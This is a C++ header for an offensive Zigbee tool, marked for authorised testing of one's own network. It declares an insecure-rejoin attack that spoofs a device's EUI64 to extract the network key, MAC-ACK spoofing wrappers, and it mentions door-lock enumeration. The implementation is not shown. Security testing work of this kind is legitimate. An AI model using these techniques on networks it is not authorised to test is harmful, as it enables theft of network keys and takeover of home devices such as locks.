/*
 * ZbAttack.h — offensive Zigbee probes (ZigDiggity-style)
 *
 * FOR AUTHORISED SECURITY TESTING OF YOUR OWN NETWORK ONLY.
 *
 * Implements two of ZigDiggity's attacks that need no captured network key:
 *
 *  - insecure_rejoin: impersonate a known device (by spoofing its EUI64) and
 *    send an *unsecured* NWK Rejoin Request. On networks whose Trust Center
 *    policy permits insecure/Trust-Center rejoin, the coordinator answers with
 *    a Rejoin Response and then transports the network key encrypted only with
 *    the well-known default TCLK — which the existing ZbKeyCapture pipeline
 *    then recovers passively. This is the classic way to pull the network key
 *    off a misconfigured network without ever seeing a fresh device join.
 *
 *  - ack_attack: the timing-critical MAC-ACK spoofing lives in the RX ISR
 *    inside IEEE802154Sniffer (startAckAttack/stopAckAttack); this class only
 *    provides thin wrappers so all the offensive verbs share one surface and
 *    print consistent [ATTACK] banners.
 *
 * find_lock (endpoint/cluster enumeration to locate door locks) lives in
 * ZbPing, since it reuses that class's ZDO request/response machinery.
 */

#pragma once
#include <Arduino.h>
#include "IEEE802154Sniffer.h"

// NWK command frame IDs (Zigbee spec 3.4)
#define ZB_NWK_CMD_REJOIN_REQUEST   0x06
#define ZB_NWK_CMD_REJOIN_RESPONSE  0x07

class ZbAttack {
public:
    ZbAttack(IEEE802154Sniffer &sniffer);

    // --- insecure_rejoin ----------------------------------------------------
    // Impersonate the host at targetShortAddr (must be a known host with a
    // captured EUI64) and send an unsecured NWK Rejoin Request to the
    // coordinator. Leaves the spoofed EUI64 active so any resulting Transport
    // Key is attributed correctly; call sniffer.restoreOwnEUI64() (command 'M'
    // with no arg) afterwards. Watch for a '*** Network key captured! ***'.
    bool insecureRejoin(uint16_t targetShortAddr);

    // --- ack_attack (wrappers over the sniffer ISR path) --------------------
    void ackAttack(uint16_t targetShortAddr);   // arm
    void stopAckAttack();                        // disarm
    void printAckAttackStatus() const;

private:
    IEEE802154Sniffer &_sniffer;
    uint8_t _nwkSeq;

    bool _sendRejoinRequest(uint16_t coordShort, uint16_t pan, uint64_t spoofEui64);
};
